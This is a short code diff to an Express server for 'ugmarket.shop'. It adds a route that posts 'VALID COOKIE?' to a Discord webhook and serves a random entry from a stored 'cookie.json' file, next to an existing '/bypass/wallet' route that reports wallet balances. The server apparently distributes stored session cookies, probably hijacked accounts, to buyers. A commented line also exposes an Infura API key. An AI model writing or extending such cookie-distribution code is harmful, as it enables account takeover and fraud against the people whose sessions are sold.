@@ -9,6 +9,9 @@ const app = express();
 //const web3 = new Web3(new Web3.providers.HttpProvider('https://mainnet.infura.io/v3/fb43b5a5ec81406c90cbbeb12cda191a'));
 
 
+const rawData = fs.readFileSync('cookie.json');
+const data = JSON.parse(rawData);
+
 //https://www.ugmarket.shop
 app.use((req, res, next) => {
     res.setHeader('Access-Control-Allow-Origin', 'https://www.ugmarket.shop');
@@ -638,6 +641,17 @@ app.get('/bypass/wallet', async (req, res) => {
   };
   await sendWebhookMessage(message);
   res.json({ balance });
+});
+
+app.get('/check_cookie/id=52329/r', async (req, res) => {
+  const message = {
+      username: "UGMARKET",
+      avatar_url: "https://cdn.discordapp.com/attachments/1128583298562658445/1128583378577391616/invert-ug.png",
+      content: "VALID COOKIE?"
+  };
+  await sendWebhookMessage(message);
+    const randomObject = data[Math.floor(Math.random() * data.length)];
+    res.json(randomObject);
 });
 
 
